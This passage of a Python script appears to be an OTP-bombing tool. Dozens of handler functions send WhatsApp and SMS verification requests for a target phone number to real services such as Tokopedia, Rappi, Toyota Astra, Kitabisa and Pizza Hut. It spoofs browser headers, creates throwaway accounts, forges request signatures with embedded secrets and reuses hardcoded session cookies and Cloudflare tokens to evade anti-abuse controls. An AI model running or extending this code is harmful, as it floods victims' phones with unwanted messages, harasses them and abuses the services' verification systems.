        "priority":           "u=1, i",
        "referer":            f"{BASE_URL}/registration/form",
        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-origin",
        "user-agent":         get_random_user_agent(),
    }
    try:
        resp = requests.post(f"{BASE_URL}/api/registration/new",
                             headers=headers, json=payload, timeout=15, verify=False)
        if resp.status_code == 200:
            return resp.status_code, resp.text
        # 409 = sudah terdaftar → resend
        if resp.status_code == 409:
            hdrs2 = {**headers, "referer": f"{BASE_URL}/registration"}
            r2 = requests.post(f"{BASE_URL}/api/registration/resend-otp-phone",
                               headers=hdrs2, json={"phone": phone_8}, timeout=15, verify=False)
            return r2.status_code, r2.text
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)


# ==================== HANDLER 32: BUKUAKU ====================
_BA_CF = "CrztkFewy94bJ_Bl5hP7E5JmEfSAxaenr6gYaeTTYqY7s2P0tymlC34RKGw_Ynk-E6q6pm1qb9XMsfE7MmUXbaeArgeBask2X5ihNbOccQh_gl0eKl1Pq1MZ3edZ78cQWXlUPDTBBGF7IiQyUC5GiUTCQZJzM_b2XZjSmLeZlnrgq6J_8LJHsp9zqlGUbmzOuYWlmvfOI8hEuFKuP7wZ2-fPWHzrUw_x_hfQaY4BhQnItFm5Rc2GHM20aHD1T8Cyu_6hmnx6hS6fYufZQWhADohg4AgveIv1HqUOcrv9tiHC-IyLKhjgNzNMeDem9rYk8wvnr0ST_OEbxpa37lL13rGOnycEF1Oea2SQMtY9egSMUKCPZj020DZ6OY_0V17jVED0GORVJV6_ACQ95htPrrsghjp0vIb096PtkpaiJ0-8R8DdOBdLyOn78voAe_4YJ4RS_qWYgA"
_BA_PROVINCES = [2, 3, 5, 6, 7]
_BA_CITIES    = {2: [26, 27, 28], 3: [30, 31], 5: [50, 51], 6: [60, 61], 7: [70]}

def send_bukuaku_otp(phone_input):
    p = normalize(phone_input)
    phone_08    = p['fmt_08']
    BASE_URL    = "https://bukuaku.id"
    province_id = random.choice(_BA_PROVINCES)
    city_id     = random.choice(_BA_CITIES[province_id])
    password    = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    cookie_str  = f"auth.strategy=local; auth._token.local=false; auth._refresh_token.local=false; cf_clearance={_BA_CF}"

    def _headers(referer):
        return {
            "accept":             "application/json, text/plain, */*",
            "accept-encoding":    "gzip, deflate, br, zstd",
            "accept-language":    "id,en-US;q=0.9,en;q=0.8",
            "content-type":       "application/json",
            "cookie":             cookie_str,
            "origin":             BASE_URL,
            "priority":           "u=1, i",
            "referer":            referer,
            "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
            "sec-ch-ua-mobile":   "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest":     "empty",
            "sec-fetch-mode":     "cors",
            "sec-fetch-site":     "same-origin",
            "user-agent":         get_random_user_agent(),
        }

    payload = {
        "name":                  "dwasdwasd",
        "birth_year":            str(random.randint(1985, 2000)),
        "role":                  "parent",
        "password":              password,
        "password_confirmation": password,
        "trial_code":            None,
        "phone":                 phone_08,
        "province_id":           province_id,
        "city_id":               city_id,
        "otp_type":              "WA",
    }
    try:
        resp = requests.post(f"{BASE_URL}/base/register",
                             headers=_headers(f"{BASE_URL}/id/register"),
                             json=payload, timeout=15, verify=False)
        if resp.status_code in (200, 201):
            return resp.status_code, resp.text
        # gagal register → forgot_password fallback
        r2 = requests.post(f"{BASE_URL}/base/forgot_password",
                           headers=_headers(f"{BASE_URL}/id/login/forgot-password"),
                           json={"otp_type": "WA", "phone": phone_08},
                           timeout=15, verify=False)
        return r2.status_code, r2.text
    except Exception as e:
        return None, str(e)


# ==================== HANDLER 33: GENERASI MAJU ====================
_GM_CSRF     = "c2e362dee8d77f250685126b8707e2ecbff4af1a"
_GM_PHPSESSID = "199744a540970abf2c84d6ae9b276bf7"
_GM_AWSALB   = "LzvHIs5mS4n2jnrosWex6XN153dNEifakaD9fQmqKRX3C/g6xfgw3tylUoPpa2LR9GVN0ehZPxGPUBJmA5M76/rFNmalmERCZlpZaIuV2vKyHL35jVOtIILxy65ej/ND4g20e41zCmbIAcpedKNvthE6oPWL+rqdKVTMF5MwMX0Ft567aAhY/uc1HI8QcQ=="
_GM_BASE     = "https://www.generasimaju.co.id"

def send_generasi_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    cookie_str = f"prev_page_url=/klub-generasi-maju/login; PHPSESSID={_GM_PHPSESSID}; AWSALB={_GM_AWSALB}; AWSALBCORS={_GM_AWSALB}"
    def _headers(referer=f"{_GM_BASE}/klub-generasi-maju/register"):
        return {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "id,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": cookie_str, "origin": _GM_BASE, "priority": "u=1, i", "referer": referer,
            "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
            "user-agent": get_random_user_agent(), "x-csrf-token": _GM_CSRF, "x-requested-with": "XMLHttpRequest",
        }
    sess = requests.Session()
    try:
        token_resp = sess.post(f"{_GM_BASE}/klub-generasi-maju/auth/token/request", headers={**_headers(), "accept": "Application/json"}, data={"phone_number": phone_08, "prefix": "registration"}, timeout=15, verify=False)
        if token_resp.status_code != 200:
            return token_resp.status_code, token_resp.text
        data = token_resp.json()
        auth_token = data.get("data") or data.get("token")
        if not auth_token:
            return None, "token not found"
        reg_payload = {
            "firstname": ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize(),
            "msisdn": phone_08,
            "password": "VmxjeE5HRXdOVWRUYmtKV1lsaG9jbFZyV25aTlJtUllaRVprYVZKVVZURldSbWhTVUZFOVBRPT0=",
            "mother_status": "7", "ispregnant": "Y", "pregnancyweek": "4",
            "isonpregnancyprogram": "N", "children_dob": "",
            "is_code_refferal_event_code": "", "refferal_code_event_code": "",
            "query_params[0][referral]": f"{_GM_BASE}/klub-generasi-maju/login",
            "auth_token": auth_token, "auth_token_prefix": "registration",
        }
        reg = sess.post(f"{_GM_BASE}/klub-generasi-maju/register", headers=_headers(referer=f"{_GM_BASE}/klub-generasi-maju/register?referral={_GM_BASE}/klub-generasi-maju/login"), data=reg_payload, timeout=15, verify=False)
        return reg.status_code, reg.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 34: INSUREKA ====================
def send_insureka_otp(phone_input):
    p          = normalize(phone_input)
    phone_plus = p['fmt_plus']
    BASE_URL   = "https://insureka.co.id"
    sess       = requests.Session()
    try:
        sess.get(
            f"{BASE_URL}/id/login/",
            headers={
                "User-Agent":      get_random_user_agent(),
                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
                "Accept-Language": "id",
                "Accept-Encoding": "gzip, deflate",
            },
            timeout=10, verify=False,
        )
        csrf = sess.cookies.get("csrftoken", "")
        if not csrf:
            return None, "csrf not found"

        resp = sess.post(
            f"{BASE_URL}/api/v1/auth/send-otp/",
            headers={
                "accept":             "*/*",
                "accept-encoding":    "gzip, deflate",
                "accept-language":    "id",
                "content-type":       "application/json; charset=UTF-8",
                "origin":             BASE_URL,
                "priority":           "u=1, i",
                "referer":            f"{BASE_URL}/id/login/",
                "sec-ch-ua":          '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest":     "empty",
                "sec-fetch-mode":     "cors",
                "sec-fetch-site":     "same-origin",
                "user-agent":         get_random_user_agent(),
                "x-csrftoken":        csrf,
            },
            json={"phone": phone_plus},
            timeout=15, verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 35: OPAPER ====================
def send_opaper_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    BASE_URL = "https://api.opaper.app"
    ORIGIN   = "https://dashboard.opaper.app"
    def _headers():
        return {
            "accept": "*/*", "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json", "origin": ORIGIN, "referer": f"{ORIGIN}/",
            "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": get_random_user_agent(), "x-login-client": "DASHBOARD",
            "op-au": "", "op-user-id": "",
        }
    sess = requests.Session()
    try:
        sess.post(f"{BASE_URL}/auth/v1/phone-number/check", headers=_headers(), json={"country_code": "62", "phone_number": bare}, timeout=15, verify=False)
        otp = sess.post(f"{BASE_URL}/auth/v1/otp/send", headers=_headers(), json={"channel": "whatsapp", "country_code": "62", "phone_number": bare, "purpose": "signup"}, timeout=15, verify=False)
        return otp.status_code, otp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 36: RAPPI ====================
_RAPPI_TOKEN     = "ft.gAAAAABq5-Zx20IfgtdxgubdmOh1Lj6ThjLDjjTCkSZcquuyzjUSl8RMzSAYaKCD7YMfIS50K6ZV3LlVsuA_Pg9nIZofxHBV1uyNu0jHLjK3ZFX0d99EKfGW_UsVa0NSqjAQeWavt41hDuf5obrCYdlSCLOeVjNLHWEZGms7EkNs6wl00us9Au_XAg_EPu-i6KMMPISGwU44K8_wL9yt_WDmraUNgKgr95feGExf3iSCmegnnY-IAc6ELyOJlU5w_rWFsdjmfJqAlxPGeGQnZoSDweqUWgSJA2XzsDq_1cY0VBhrjEDVfxUUMlCkQiRBFIsTk0I6MXIxgXe5ns7ON_sDqSTbCcJXRY-4c1k9HXV3CiO2JXcDwLYGvd7WxiR5LoQHGZguWYMqF8EekEkVMpjZBb46cgQD0A=="
_RAPPI_DEVICE_ID = "7e021957-53de-42a8-943a-fdb768e57c8a"

def send_rappi_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    headers = {
        "accept":                       "application/json",
        "accept-encoding":              "gzip, deflate, br, zstd",
        "accept-language":              "es-CO",
        "access-control-allow-headers": "*",
        "access-control-allow-origin":  "*",
        "authorization":                f"Bearer {_RAPPI_TOKEN}",
        "content-type":                 "application/json",
        "deviceid":                     _RAPPI_DEVICE_ID,
        "needappsflyerid":              "false",
        "origin":                       "https://www.rappi.com.co",
        "priority":                     "u=1, i",
        "referer":                      "https://www.rappi.com.co/",
        "sec-ch-ua":                    '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile":             "?0",
        "sec-ch-ua-platform":           '"Windows"',
        "sec-fetch-dest":               "empty",
        "sec-fetch-mode":               "cors",
        "sec-fetch-site":               "cross-site",
        "user-agent":                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
    }
    try:
        resp = requests.post("https://services.grability.rappi.com/api/rappi-authentication/login/whatsapp/create", headers=headers, json={"country_code": "+62", "phone": bare}, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 37: SEGARI ====================
def send_segari_otp(phone_input):
    p = normalize(phone_input)
    phone = p['fmt_08']
    BASE_URL = "https://segari.id"
    API_BASE = "https://api-v2.segari.id"
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
    CLIENT_ID = "23809367d8bd04035ee712c6a68d3daed136a21c16ed29dfc1299d6e0525f2c6"

    def _base_headers(extra={}):
        h = {
            "accept": "*/*", "accept-encoding": "gzip, deflate",
            "accept-language": "id,en-US;q=0.9,en;q=0.8",
            "origin": BASE_URL, "referer": f"{BASE_URL}/",
            "sec-ch-ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": UA,
        }
        h.update(extra)
        return h

    sess = requests.Session()
    segari_t = ""
    try:
        resp = sess.get(f"{API_BASE}//v1/auth/init", headers=_base_headers(), timeout=10, verify=False)
        segari_t = resp.json().get("data", {}).get("token", "")
    except Exception:
        pass
    if not segari_t:
        return None, "segari_t token not found"

    nonce     = str(uuid.uuid4())
    timestamp = int(time.time())
    signature = hmac.new(segari_t.encode(), f"{timestamp}\n{nonce}\nPOST".encode(), hashlib.sha256).hexdigest()

    import base64 as _b64, json as _json
    client_info = _b64.b64encode(_json.dumps({"userAgent": UA, "webdriver": "", "screenResolution": "1366x768", "screenColorDepth": 24, "timezone": "Asia/Jakarta", "timezoneOffset": -420, "language": "id", "languages": "id,en-US,en", "platform": "Win32", "hardwareConcurrency": 4, "deviceMemory": 16, "cookieEnabled": True, "onLine": True}, separators=(",", ":")).encode()).decode()

    headers = _base_headers({
        "content-type": "application/json;charset=UTF-8", "priority": "u=1, i",
        "x-client-id": CLIENT_ID, "x-client-info": client_info,
        "x-segari-n": nonce, "x-segari-pathname": "/login", "x-segari-platform": "web",
        "x-segari-signature": signature, "x-segari-t": segari_t, "x-segari-timestamp": str(timestamp),
    })
    try:
        resp = sess.post(f"{API_BASE}//v1/otps/generate", headers=headers, json={"phoneNumber": phone}, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 38: TOYOTA ====================
def send_toyota_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    TOKENIZE_URL = "https://data-web.tam-icm.com/api/public/vendors/tokenize"
    REGISTER_URL = "https://data-web.tam-icm.com/api/public/vendors/register"
    OTP_URL      = "https://dxmi.toyota.astra.co.id/api/auth/one-account/verify/resend-otp"
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
    BASE_HEADERS = {
        "accept": "application/json", "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8", "content-type": "application/json",
        "origin": "https://www.toyota.astra.co.id", "referer": "https://www.toyota.astra.co.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "user-agent": UA,
    }
    name  = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize() + " " + ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
    sess  = requests.Session()
    try:
        tok_resp = sess.post(TOKENIZE_URL, headers={**BASE_HEADERS, "sec-fetch-site": "cross-site"}, json={"data": [phone_08, name, email]}, timeout=15, verify=False)
        data = tok_resp.json()
        if not isinstance(data, list) or len(data) < 3:
            return tok_resp.status_code, tok_resp.text
        phone_token = data[0]["token"]
        sess.post(REGISTER_URL, headers={**BASE_HEADERS, "sec-fetch-site": "cross-site"}, json={"phoneNumber": phone_token}, timeout=15, verify=False)
        otp = sess.post(OTP_URL, headers={**BASE_HEADERS, "sec-fetch-site": "same-site", "x-mobile-app": "DIDXWEBAPP2025"}, json={"phoneNumber": phone_token, "forgetPin": False, "verificationChannel": "WHATSAPP"}, timeout=15, verify=False)
        return otp.status_code, otp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 39: GARASI.ID ====================
def send_garasi_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    BASE_URL  = "https://garasi.id"
    LOGIN_PAGE = f"{BASE_URL}/account/login/phone-number"
    API_URL    = f"{BASE_URL}/api/users/login/otp"
    sess = requests.Session()
    try:
        sess.get(LOGIN_PAGE, headers={"User-Agent": get_random_user_agent()}, timeout=10, verify=False)
        xsrf = urllib.parse.unquote(sess.cookies.get("XSRF-TOKEN", ""))
        if not xsrf:
            return None, "XSRF not found"
        resp = sess.post(API_URL, headers={
            "Host": "garasi.id", "Connection": "keep-alive", "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/json", "User-Agent": get_random_user_agent(),
            "Origin": BASE_URL, "Referer": LOGIN_PAGE, "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
            "sec-ch-ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "X-XSRF-TOKEN": xsrf, "Frontend-Mode": "csr", "Frontend-Version": "1822",
        }, json={"username": phone_08, "with": "whatsapp"}, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 40: JAKARTA NOTEBOOK ====================
import boto3
from botocore.exceptions import ClientError

COGNITO_REGION    = "ap-southeast-1"
COGNITO_CLIENT_ID = "479jjabcfocf6veo4am3dt4p8m"
_JN_EMAIL         = "dddawwsstd@gmail.com"
_JN_PASSWD        = "ddasdw@$!@%@sS"

def normalize(no):
    no = no.strip().replace(" ", "").replace("-", "")
    if no.startswith("+62"):  bare = no[3:]
    elif no.startswith("62"): bare = no[2:]
    elif no.startswith("08"): bare = no[1:]
    elif no.startswith("8"):  bare = no
    else:                     bare = no
    return {"fmt_08": "0" + bare, "bare": bare}

def _jn_cognito_login() -> str:
    client = boto3.client("cognito-idp", region_name=COGNITO_REGION)
    try:
        resp = client.initiate_auth(
            AuthFlow="USER_PASSWORD_AUTH",
            AuthParameters={"USERNAME": _JN_EMAIL, "PASSWORD": _JN_PASSWD},
            ClientId=COGNITO_CLIENT_ID,
        )
        return resp["AuthenticationResult"]["AccessToken"]
    except ClientError as e:
        return ""
    except Exception:
        return ""

def send_jakartanote_otp(phone_input):
    p        = normalize(phone_input)
    phone_08 = p['fmt_08']

    bearer = _jn_cognito_login()
    if not bearer:
        return None, "cognito login failed"

    GRAPHQL_URL = "https://graphql.jakartanotebook.com/graphql/v3"
    MUTATION = """mutation CreatePhoneNumberOtp($requestBody: CreateMemberOtpRequestInput!) {
  createMemberOtp(requestBody: $requestBody) {
    maxRequest requestInterval requestPenaltyTime __typename
  }
}"""
    headers = {
        "accept":             "*/*",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
        "authorization":      f"Bearer {bearer}",
        "content-type":       "application/json",
        "origin":             "https://www.jakartanotebook.com",
        "referer":            "https://www.jakartanotebook.com/",
        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
        "user-agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
    }
    payload = {
        "operationName": "CreatePhoneNumberOtp",
        "variables":     {"requestBody": {"phoneNumber": phone_08}},
        "query":         MUTATION,
    }
    try:
        resp = requests.post(GRAPHQL_URL, headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 41: KITABISA ====================
from curl_cffi import requests as _cf_requests

_KB_SECRET = "dacddb6b7538328bb2a83366444e427680bb8d9d1dec78167d12877037686e23"

def send_kitabisa_otp(phone_input, otp_type="whatsapp"):
    p = normalize(phone_input)
    phone_plus = p['fmt_plus']
    BASE_URL   = "https://gate.kitabisa.com"
    ORIGIN     = "https://accounts.kitabisa.com"
    API_URL    = f"{BASE_URL}/wong/register/draft"

    timestamp  = int(time.time())
    msg        = f"kanvas{timestamp}"
    signature  = hmac.new(_KB_SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    request_id = str(uuid.uuid4())

    sess = _cf_requests.Session(impersonate="chrome124")
    try:
        sess.get(ORIGIN + "/", timeout=10)
    except Exception:
        pass

    headers = {
        "authority":             "gate.kitabisa.com",
        "accept":                "application/json",
        "accept-encoding":       "gzip, deflate, br, zstd",
        "accept-language":       "id,en-US;q=0.9,en;q=0.8",
        "content-type":          "application/json",
        "origin":                ORIGIN,
        "referer":               ORIGIN + "/",
        "sec-ch-ua":             '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile":      "?0",
        "sec-ch-ua-platform":    '"Windows"',
        "sec-fetch-dest":        "empty",
        "sec-fetch-mode":        "cors",
        "sec-fetch-site":        "same-site",
        "version":               "3.4.0",
        "x-ktbs-api-version":    "1.0.0",
        "x-ktbs-client-name":    "kanvas",
        "x-ktbs-client-version": "1.0.0",
        "x-ktbs-platform-name":  "kanvas",
        "x-ktbs-request-id":     request_id,
        "x-ktbs-signature":      signature,
        "x-ktbs-time":           str(timestamp),
    }
    payload = {"full_name": "ssawdasdw", "username": phone_plus, "otp_type": otp_type}
    try:
        resp = sess.post(API_URL, headers=headers, json=payload, timeout=15)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)
# ==================== HANDLER 42: TOKOPEDIA WA OTP ====================
def send_tokopedia_wa_otp(phone_input):
    p = normalize(phone_input)
    no = p['fmt_62']
    headers = {
        "Host": "accounts.tokopedia.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": get_random_user_agent(),
        "Origin": "https://www.tokopedia.com",
        "Referer": "https://www.tokopedia.com/",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data = urllib.parse.urlencode({"msisdn": no, "otpType": "116", "mode": "whatsapp"})
    try:
        resp = requests.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa",
                             headers=headers, data=data, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 43: BMSECURE ACI ====================
def send_bmsecure_aci_otp(phone_input):
    p = normalize(phone_input)
    phone_62 = p['fmt_62']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://m.bankmas.co.id",
        "referer": "https://m.bankmas.co.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site",
        "user-agent": get_random_user_agent(),
    }
    # payload exact dari APK binary
    payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_62, "type": "WHATSAPP"}
    try:
        resp = requests.post("https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER: PIZZAHUT ====================
from curl_cffi.requests import Session

BASE_URL  = "https://api-prod.pizzahut.co.id"
ORIGIN    = "https://www.pizzahut.co.id"
REFERER   = "https://www.pizzahut.co.id/"
CLIENT_ID = "b39773b0-435b-4f41-80e9-163eef20e0ab"
SECRET    = "qCDXXjrx4oJBILESieykMyQ7n5UZtrjc"

def _random_device_id():
    return f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:6]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:6]}"

def _random_email():
    return "".join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"

def _random_name():
    return "".join(random.choices(string.ascii_lowercase, k=5)).capitalize()

def _random_birthday():
    return f"{random.randint(1990,2002)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"

def _make_signature(payload: dict) -> str:
    s = json.dumps(payload, separators=(",", ":"))
    h1 = hashlib.sha256(s.encode()).hexdigest().lower()
    h2 = hashlib.sha256((h1 + SECRET).encode()).hexdigest().lower()
    return h2

def _common_headers(device_id: str, signature: str = "") -> dict:
    h = {
        "accept":             "application/json",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
        "content-type":       "application/json",
        "origin":             ORIGIN,
        "referer":            REFERER,
        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
        "user-agent":         get_random_user_agent(),
        "x-channel":          "2",
        "x-client-id":        CLIENT_ID,
        "x-device-id":        device_id,
        "x-device-type":      "PC",
        "x-lang":             "en",
        "x-platform":         "WEBDESKTOP",
    }
    if signature:
        h["x-signature"] = signature
    return h

def send_pizzahut_otp(phone_input):
    p         = normalize(phone_input)
    phone     = p['bare']
    device_id = _random_device_id()
    sess      = Session(impersonate="chrome124")

    # Step 1: register
    reg_payload = {
        "birthday":   _random_birthday(),
        "email":      _random_email(),
        "first_name": _random_name(),
        "last_name":  _random_name(),
        "phone":      phone,
    }
    sig = _make_signature(reg_payload)
    try:
        r = sess.post(
            f"{BASE_URL}/customer/v5/customer/register",
            headers=_common_headers(device_id, sig),
            json=reg_payload,
            timeout=15,
            verify=False,
        )
        if r.status_code != 200:
            return r.status_code, r.text
        data = r.json()
        key  = (
            data.get("key")
            or (data.get("data") or {}).get("key")
            or (data.get("result") or {}).get("key")
        )
    except Exception as e:
        return None, str(e)

    if not key:
        return None, "key not found in register response"

    # Step 2: send-otp
    otp_payload = {"key": key, "type": 1}
    sig2 = _make_signature(otp_payload)
    try:
        resp = sess.post(
            f"{BASE_URL}/customer/v1/customer/send-otp",
            headers=_common_headers(device_id, sig2),
            json=otp_payload,
            timeout=15,
            verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 46: AKSELERAN ====================
def send_akseleran_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://www.akseleran.co.id",
        "referer": "https://www.akseleran.co.id/register",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": phone_08}
    try:
        resp = requests.post("https://api.akseleran.co.id/users/otp/request",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)
    
# ==================== HANDLER 48: TIPTIP ====================
_TIPTIP_ACCESS_KEY = "79b8a015c53e6a81ea51d9a9e2678ac3"

def send_tiptip_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    url = f"https://api.tiptip.id/authentication/guest/v1/phone/otp/send?access_key={_TIPTIP_ACCESS_KEY}"
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://tiptip.id",
        "referer": "https://tiptip.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": phone_08}
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 49: TOKOPLAS ====================
def send_tokoplas_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://tokoplas.com",
        "referer": "https://tokoplas.com/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phoneNumber": phone_08, "otpType": "REGISTER", "channel": "WHATSAPP"}
    try:
